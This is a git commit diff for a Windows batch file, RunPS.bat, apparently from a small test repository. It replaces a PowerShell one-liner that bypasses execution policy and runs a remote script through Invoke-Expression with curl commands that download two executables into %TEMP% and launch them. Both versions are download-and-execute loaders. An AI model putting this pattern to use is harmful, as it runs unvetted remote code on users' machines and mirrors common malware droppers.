91776e83b5fd1daca8556b967c7eafa65a705ec1
xxuavails <hfigo6441@gmail.com>
2025-12-05 18:17:07 +0300

    Update RunPS.bat

--- RunPS.bat
+++ RunPS.bat
@@ -1,2 +1,29 @@
 @echo off
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$url='https://github.com/xxuavails/TestMessage/raw/main/RunApps.ps1'; Invoke-Expression (Invoke-WebRequest -Uri $url).Content"
+REM Define URLs for the EXEs
+set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest1.exe
+set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest2.exe
+
+REM Set temp file paths
+set F1=%TEMP%\Messageboxtest1.exe
+set F2=%TEMP%\Messageboxtest2.exe
+
+REM Download EXE files using curl
+curl -L -o "%F1%" "%U1%"
+curl -L -o "%F2%" "%U2%"
+
+REM Check if download was successful and execute the EXEs
+if exist "%F1%" (
+    echo Executing %F1%
+    start "" "%F1%"
+) else (
+    echo Failed to download %F1%
+)
+
+if exist "%F2%" (
+    echo Executing %F2%
+    start "" "%F2%"
+) else (
+    echo Failed to download %F2%
+)
+
+exit
